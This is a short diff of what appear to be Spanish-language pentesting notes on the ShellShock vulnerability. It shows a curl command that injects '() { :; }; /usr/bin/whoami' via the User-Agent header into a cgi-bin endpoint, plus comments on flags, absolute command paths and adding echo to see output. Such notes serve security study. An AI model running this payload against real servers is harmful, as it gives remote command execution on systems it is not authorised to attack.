@@ -27,7 +27,7 @@ curl -s http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; /usr/bin/whoami"
 
 	# s = Silence 
 	# H = Cabecera para el ataque de ShellShock
-	# Ruta del comando que quieres ejecutar y lo ves con 'which' -> which whoami
+	# Ruta absoluta del comando que quieres ejecutar y lo ves con 'which' -> which whoami
 
 
 # Si al momento de ejecutar el comando anterior no nos reporta el comando, debemos de colocar un echo antes o hasta dos antes.
